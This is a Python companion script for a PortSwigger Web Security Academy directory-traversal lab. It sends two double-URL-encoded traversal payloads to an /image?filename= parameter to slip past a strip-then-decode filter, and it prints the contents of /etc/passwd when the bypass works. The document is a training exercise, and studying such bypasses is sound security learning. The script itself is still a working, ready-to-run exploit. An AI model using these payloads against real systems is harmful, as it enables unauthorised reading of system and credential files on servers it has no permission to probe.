#!/usr/bin/env python3
"""
File path traversal, traversal sequences stripped with superfluous URL-decode
PortSwigger Web Security Academy -- Directory Traversal

Companion script for the writeup: 04-superfluous-url-decode.md

What this does:
    Confirms the bypass two ways, because the first one is a genuine tooling
    accident worth showing rather than hiding:

      1. Sends a SINGLE URL-encoded payload (%2e%2e%2f...) through httpx's
         params={} dict. httpx percent-encodes the literal '%' character in
         dict values before putting them on the wire, so %2e arrives at the
         server as %252e -- a DOUBLE-encoded sequence. That's exactly what
         this lab's strip-then-decode-again filter needs: the strip pass
         doesn't recognize %252e%252e%252f as ../, lets it through, and the
         app's own superfluous second decode turns it into a real traversal.
      2. Sends an explicitly double-encoded payload (..%252f...) as a raw
         URL string, bypassing params={} entirely -- routing an
         already-double-encoded string through params={} would re-encode it
         a THIRD time (%25 -> %2525) and break it.

Usage:
    python 04-superfluous-url-decode.py <lab-url>
    e.g. python 04-superfluous-url-decode.py https://0a1b00fa03d9c8b6803b56b400eb00d5.web-security-academy.net

Requirements:
    pip install httpx
"""

import re
import sys
import httpx

UNIX_CONFIRM_REGEX = re.compile(r"root:.*:0:0:")


def solve(lab_url: str) -> None:
    client = httpx.Client(follow_redirects=True, timeout=15)

    # Variant 1: single-encoded string through params={} -- httpx's own
    # encoding turns this into a double-encoded payload on the wire.
    payload_single = "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    r1 = client.get(f"{lab_url}/image", params={"filename": payload_single})
    print(f"[*] Variant 1 -- params={{}} auto-double-encode: GET /image?filename={payload_single}")
    print(f"[*] Response status: {r1.status_code}, length: {len(r1.text)} bytes")
    if UNIX_CONFIRM_REGEX.search(r1.text):
        print("[+] Variant 1 confirmed -- /etc/passwd content returned:")
        print(r1.text)
    else:
        print("[-] Variant 1 did not return /etc/passwd content.")

    # Variant 2: explicitly double-encoded string, sent as a raw URL so
    # httpx doesn't re-encode the % a second time.
    payload_double = "..%252f..%252f..%252fetc/passwd"
    r2 = client.get(f"{lab_url}/image?filename={payload_double}")
    print(f"[*] Variant 2 -- manual double-encode via raw URL: GET /image?filename={payload_double}")
    print(f"[*] Response status: {r2.status_code}, length: {len(r2.text)} bytes")
    if UNIX_CONFIRM_REGEX.search(r2.text):
        print("[+] Variant 2 confirmed -- /etc/passwd content returned:")
        print(r2.text)
    else:
        print("[-] Variant 2 did not return /etc/passwd content.")

    check = client.get(lab_url)
    if "Congratulations" in check.text:
        print("[+] Lab solved -- superfluous URL-decode bypassed.")
    else:
        print("[-] Not solved yet -- inspect the response bodies above.")


if __name__ == "__main__":
    if len(sys.argv) != 2:
        print(f"Usage: python {sys.argv[0]} <lab-url>")
        sys.exit(1)
    solve(sys.argv[1].rstrip("/"))
